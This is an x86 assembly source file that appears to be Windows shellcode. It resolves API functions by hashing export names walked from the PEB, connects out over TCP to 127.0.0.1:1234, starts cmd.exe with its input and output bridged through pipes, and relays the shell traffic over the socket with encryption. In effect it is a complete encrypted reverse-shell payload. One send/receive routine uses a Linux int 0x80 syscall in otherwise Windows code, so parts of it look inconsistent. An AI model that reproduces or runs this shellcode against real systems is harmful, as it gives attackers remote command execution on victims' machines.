;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;  
  bits 32
  
%define WIN  
%include "include.inc" 
  
main:
_main:
      pushad 
      
      ; allocate memory
      mov    ecx, ds_tbl_size+cs_tbl_size
      sub    esp, ecx      
      mov    edi, esp
      
      ; resolve win32 api
      lodsb
      xchg   eax, ecx
init_api:          
      lodsd  
      call   resolve_api
      test   eax, eax
      jz     exit_init
      stosd
      loop   init_api
      
      ; initialize encryption keys
      call   init_keys
      %include "static_key.inc"
init_keys:      
      pop    esi
      mov    cl, @ctx
      lea    edi, [esp+ecx]
      mov    cl, SPP_CTR_LEN+SPP_EKEY_LEN+SPP_MKEY_LEN
      rep    movsb
      
      ; s=socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
      push   ecx                   ; IPPROTO_IP
      push   1                     ; SOCK_STREAM
      push   2                     ; AF_INET
      xcall  @socket
      xchg   eax, ebx
      test   ebx, ebx              ; if (eax<=0) goto exit_init;
      jle    exit_init
    
      push   0x0100007f        ; sa.sin_addr=127.0.0.1
      push   0xD2040002        ; sa.sin_port=htons(1234)
                               ; sa.sin_family=AF_INET
      mov    ecx, esp          ; ecx = &sa
    
      ; connect (s, &sa, sizeof (sa));
      push   16                    ; sizeof (sa)
      push   ecx                   ; &sa
      push   ebx                   ; s
      xcall  @connect
      pop    ecx
      pop    ecx
      inc    eax      ; if (eax==SOCKET_ERROR) goto close_socket;
      jz     cls_socket          
     
      ; execute cmd.exe
      call   exec_cmd    
 
cls_socket:
      ; closesocket (s);
      push   dword [ebp+@s]
      xcall  @closesocket
    
exit_init:
      sub    esp, cs_tbl+ds_tbl
      popad
      ret

; ******************************************************** 
resolve_api:
      pushad                ; saves api hash on stack
      xor    eax, eax
      mov    eax, [fs:eax+30h]  ; eax = (PPEB) __readfsdword(0x30);
      mov    eax, [eax+0ch] ; eax = (PPEB_LDR_DATA)peb->Ldr
      mov    edi, [eax+0ch] ; edi = ldr->InLoadOrderModuleList.Flink
      jmp    get_dll
next_dll:    
      mov    edi, [edi]     ; edi = dte->InLoadOrderLinks.Flink
get_dll:
      mov    ebx, [edi+18h] ; ebx = dte->DllBase
      ; eax = IMAGE_DOS_HEADER.e_lfanew
      mov    eax, [ebx+3ch]
      ; ecx = IMAGE_DATA_DIRECTORY.VirtualAddress
      mov    ecx, [ebx+eax+78h]
      jecxz  next_dll
      ; esi = IMAGE_EXPORT_DIRECTORY.Name
      mov    esi, [ebx+ecx+0ch]
      add    esi, ebx
      xor    eax, eax
      cdq
hash_dll:
      lodsb
      add    edx, eax ;  h += *s++
      rol    edx, 13  ;  h = ROTL32(h, 13) 
      dec    eax
      jns    hash_dll
      mov    ebp, edx
      
      ; esi = offset IMAGE_EXPORT_DIRECTORY.NumberOfNames 
      lea    esi, [ebx+ecx+18h]
      lodsd
      xchg   eax, ecx
      jecxz  next_dll        ; skip if no names
      push   edi             ; save edi
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfFunctions     
      lodsd
      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
      push   eax             ; save address of functions
      ; edi = IMAGE_EXPORT_DIRECTORY.AddressOfNames
      lodsd
      add    eax, ebx        ; eax = RVA2VA(eax, ebx)
      xchg   eax, edi        ; swap(eax, edi)
      ; save IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
      lodsd
      add    eax, ebx        ; eax = RVA(eax, ebx)
      push   eax             ; save address of name ordinals
get_name:
      mov    esi, [edi+4*ecx-4] ; esi = RVA of API string
      add    esi, ebx           ; esi = RVA2VA(esi, ebx)
      xor    eax, eax           ; zero eax
      cdq                       ; h = 0
hash_name:    
      lodsb
      add    edx, eax
      rol    edx, 13
      dec    eax
      jns    hash_name
      add    edx, ebp           ; add hash of DLL string  
      cmp    edx, [esp+_eax+12] ; hashes match?
      loopne get_name           ; --ecx && edx != hash
      pop    edx                ; edx = AddressOfNameOrdinals
      pop    esi                ; esi = AddressOfFunctions
      pop    edi                ; restore DLL entry
      jne    next_dll           ; get next DLL        
      movzx  eax, word [edx+2*ecx] ; eax = AddressOfNameOrdinals[eax]
      add    ebx, [esi+4*eax] ; ecx = base + AddressOfFunctions[eax]
      mov    [esp+_eax], ebx
      popad                        ; restore all
      ret
; ******************************************************** 
wait_evt:
      pushad

      lea    esi, [ebp+@evt0]
      mov    eax, [ebp+@evt0]
      cdq
      
      ; ioctlsocket (s, FIONBIO, &off=0);
      push   edx                   ; 0
      push   esp                   ; &off
      push   8004667Eh             ; FIONBIO
      push   ebx                   ; s
      
      ; WSAEventSelect (s, evts[0], 0);
      push   edx                   ; 0
      push   eax                   ; evts[0]
      push   ebx                   ; s
      
      ; WSAEnumNetworkEvents (s, evts[0], &ne);
      push   ebp                   ; &ne
      push   eax                   ; evts[0]
      push   ebx                   ; s
      
      ; WaitForMultipleObjects (3, evts, FALSE, INFINITE);
      push   -1                    ; INFINITE
      push   edx                   ; FALSE
      push   esi                   ; &evts
      push   3   ; number of events to monitor
      
      ; WSAEventSelect (s, evts[0], FD_READ | FD_CLOSE);
      push   21h                   ; FD_READ or FD_CLOSE
      push   eax                   ; evts[0]
      push   ebx                   ; s
      xcall  @WSAEventSelect
      xcall  @WaitForMultipleObjects
      xchg   eax, edi              ; esi = event index
      xcall  @WSAEnumNetworkEvents
      xcall  @WSAEventSelect
      xcall  @ioctlsocket
      pop    edx                   ; remove &off
      
      ; if (ne.lNetworkEvents & FD_CLOSE) {
      ;   break;
      ; }    
      mov    esi, ebp
      lodsd
      test   al, FD_CLOSE
      mov    [esp+_edi], edi
      popad
      ret
    
; ********************************************************
cmd_loop:
      pushad                       ; save all
      
      ; wait for events
      call   wait_evt
      jnz    cmd_cleanup           ; socket closed

      ; zero signal indicates data received on socket
      test   edi, edi
      jz     receive_data          ; evts[0] ?
      
      ; if not 1, assume it's cmd.exe terminating or undefined error
      dec    edi
      jnz    cmd_cleanup

      ; if (pending == 0) goto read_data;
      cmp    dword [ebp+@p], edi
      mov    eax, [ebp+@out1]   ; eax=out[1]
      lea    edx, [ebp+@lap]    ; edx=&lap
      jz     read_data
      
      ; if (!GetOverlappedResult (out[1], &lap, &len, FALSE) break;
      push   edi                   ; FALSE
      push   esi                   ; &len
      push   edx                   ; &lap
      push   eax                   ; out[1]
      xcall  @GetOverlappedResult
      dec    eax
      jnz    cmd_cleanup
      jmp    send_data
read_data:
      ; ReadFile (out[1], buf, BUFSIZ, &len, &lap);
      push   edx                   ; &lap
      push   esi                   ; &len
      push   BUFSIZ
      lea    ecx, [esi+4]
      push   ecx                   ; buf
      push   eax                   ; out[1]
      xcall  @ReadFile
      
      inc    dword [ebp+@p]  ; pending++;
send_data:
      mov    ecx, [esi]            ; ecx=len
      jecxz  continue              ; if (len==0) goto continue;
      
      dec    dword [ebp+@p]  ; pending--;

      call   spp_send    
      jg     continue              ; goto continue;
receive_data:
      call   spp_recv                ; if (recv32()<=0) goto cmd_cleanup;
      jle    cmd_cleanup
      
      ; WriteFile (in[0], buf, len, &len, 0);
      push   edi                   ; 0
      push   esi                   ; &len
      lodsd
      push   eax                   ; len
      push   esi                   ; buf
      push   dword[ebp+@in0]         ; in[0]
      xcall  @WriteFile
continue:
      popad
      jmp    cmd_loop
cmd_cleanup:
      popad
      ret    
; ********************************************************    
exec_cmd:
      pushad                       ; save all
      lea    edi, [ebp+@out1]
      push   edi                   ; save for closing handles on exit
      
      ; create event for hStdOutput of cmd.exe, signalled / auto reset
      ; CreateEvent (NULL, TRUE, TRUE, NULL);
      push   eax                   ; NULL
      push   ebx                   ; TRUE
      push   ebx                   ; TRUE
      push   eax                   ; NULL
      
      ; SECURITY_ATTRIBUTES sa={sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
      push   ebx                   ; TRUE
      push   eax                   ; NULL
      push   SECURITY_ATTRIBUTES_size
      mov    esi, esp
      
      ; "\\.\pipe\1"
      push   "\1" >> 16
      push   "pipe"
      push   "\\.\"
      mov    ecx, esp
      
      ; CreateFileA ("\\\\.\\pipe\\1", MAXIMUM_ALLOWED, 0, &sa, OPEN_EXISTING, 0, NULL);
      push   eax                   ; NULL
      push   eax                   ; 0
      push   3h                    ; OPEN_EXISTING
      push   esi                   ; &sa
      push   eax                   ; 0
      push   2000000h          ; MAXIMUM_ALLOWED
      push   ecx                   ; "\\\\.\\pipe\\1", 0
      
      ; CreateNamedPipeA ("\\\\.\\pipe\\1", PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
      ;    PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 
      ;    PIPE_UNLIMITED_INSTANCES, 0, 0, 0, NULL);      
      push   eax                   ; NULL
      push   eax                   ; 0
      push   eax                   ; 0
      push   eax                   ; 0
      push   1                   ; 1 here, PIPE_UNLIMITED_INSTANCES=255
      push   eax                   ; PIPE_TYPE_BYTE or PIPE_READMODE_BYTE or PIPE_WAIT
      push   40000003h         ; PIPE_ACCESS_DUPLEX or FILE_FLAG_OVERLAPPED
      push   ecx                   ; "\\\\.\\pipe\\1", 0
      xcall  @CreateNamedPipe
      stosd                        ; save out[1]
      cdq
      
      ; CreatePipe (&in[1], &in[0], &sa, 0);
      push   edx                   ; 0
      push   esi                   ; &sa
      push   edi                   ; &in[0]
      scasd                        ; edi += 4
      push   edi                   ; &in[1]
      mov    esi, edi              ; esi = &in[1]
      scasd                        ; edi += 4
      xcall  @CreatePipe           ; should return TRUE    
      xcall  @CreateFile
      stosd                        ; save out[0]
      add    esp, SECURITY_ATTRIBUTES_size + 3*4
      
      ; create event for socket read and close events
      xcall  @WSACreateEvent
      stosd                        ; save evts[0]
      
      xcall  @CreateEvent
      stosd                        ; save evts[1]
      mov    [ebp+@lap+hEvent], eax
      cdq
      
      ; "cmd", 0
      push   "cmd"
      mov    eax, esp
      
      ; CreateProcess (NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
      push   edi                   ; &pi
      push   edi                   ; &si
      push   edx                   ; NULL
      push   edx                   ; NULL
      push   edx                   ; 0
      push   ebx                   ; TRUE
      push   edx                   ; NULL
      push   edx                   ; NULL
      push   eax                   ; "cmd", 0
      push   edx                   ; NULL
      
      push   STARTUPINFO_size
      pop    dword [edi+cb]
      inc    dword [edi+dwFlags+1] ; STARTF_USESTDHANDLES
      
      lea    edi, [edi+@si+hStdInput]
      movsd                        ; si.hStdInput = in[1];
      lodsd                        ; eax = out[0]
      stosd                        ; si.hStdOutput = out[0]
      stosd                        ; si.hStdError  = out[0]
      xcall  @CreateProcess
      pop    eax                   ; remove "cmd", 0

      mov    esi, edi
      call   cmd_loop
      
      ; TerminateProcess (pi.hProcess, GetLastError());
      push   ecx
      push   dword[ebp+@pi+hProcess]
      xcall  @TerminateProcess
      
      ; for (int i=0; i<8; i++) {
      ;   CloseHandle (h[i]);
      ; }
      pop    esi                   ; esi=&h[0];
      push   8
      pop    ebx
close_loop:
      lodsd
      push   eax
      xcall  @CloseHandle
      dec    ebx
      jnz    close_loop

      popad
      ret

; ***********************************
;
; send or receive packet, fragmented if required
;
; buflen in edx
; buf in edi
; ctx in ebp
; socket operation in ebx : SYS_RECV or SYS_SEND
; ***********************************      
socket_io:
      pushad
      xor    esi, esi         ; sum = 0
io_loop:
      cmp    esi, edx         ; sum<buflen
      jae    exit_io
      
      xor    eax, eax
      push   eax              ; flags = 0
      mov    ecx, edx
      sub    ecx, esi
      push   ecx              ; len   = buflen - sum
      lea    ecx, [esi+edi] 
      push   ecx              ; buf   = &buf[sum]
      push   dword[ebp+@s]     ; socket
      mov    ecx, esp         ; ecx   = &args          
      int    0x80
      
      add    esp, 4*4         ; fix-up stack
      
      test   eax, eax         ; if (len <= 0) return -1; 
      jle    exit_io
      
      add    esi, eax         ; sum += len
      jmp    io_loop
exit_io:
      test   eax, eax
      mov    [esp+_eax], esi  ; return sum          
      popad
      ret      
; ***********************************
;
; send packet, fragmented if required
;
; buflen in edx
; buf in edi
; ctx in ebp
; ***********************************
send_pkt:
      pushad
      ; 1. wrap
      xor    ecx, ecx         ; ecx = ENCRYPT
      call   encrypt
      xchg   eax, edx      
      ; 2. send
      call   socket_io   
      popad
      ret
; ***********************************
;
; send data, encrypted if required
;
; ***********************************      
spp_send:
      pushad      
      ; 1. send length (including MAC)
      pushad
      pushad
      mov    edi, esp
      mov    dword[edi], edx ; store length of outgoing data
      add    dword[edi], 8
      mov    dl, 4       ; send 4 bytes, assumes BUFSIZ < 256
      call   send_pkt
      popad
      popad  
      jle    exit_send      
      ; 2. send the data
      call   send_pkt      
exit_send:    
      popad
      ret
; ***********************************
;
; receive packet, fragmented if required
;
; buflen in edx
; buf in edi
; ctx in ebp
;
; socket_io will return sum of bytes received
; encrypt will return decrypted bytes or -1
;
; the test will set flags accordingly
; a JLE is for an error
; ***********************************
recv_pkt:
      pushad     
      ; 1. receive
      call   socket_io
      jle    exit_rpkt      
      ; 2. unwrap
      push   1
      pop    ecx              ; ecx = DECRYPT
      call   encrypt
      test   eax, eax
exit_rpkt:      
      mov    [esp+_eax], eax  ; return length or -1 on error 
      popad
      ret
; ***********************************
;
; receive data, decrypt if required
;
; ***********************************      
spp_recv:
      pushad
      ; 1. receive the length (which includes a MAC)
      push   4 + 8             ; sizeof(uint32_t) + SPP_MAC_LEN
      pop    edx
      call   recv_pkt
      jle    exit_recv      
      ; 2. receive the data
      mov    edx, [edi]        ; edx = buflen      
      call   recv_pkt
exit_recv:
      mov    [esp+_eax], eax   ; return length or -1   
      popad
      ret
    
%include "cpx.asm"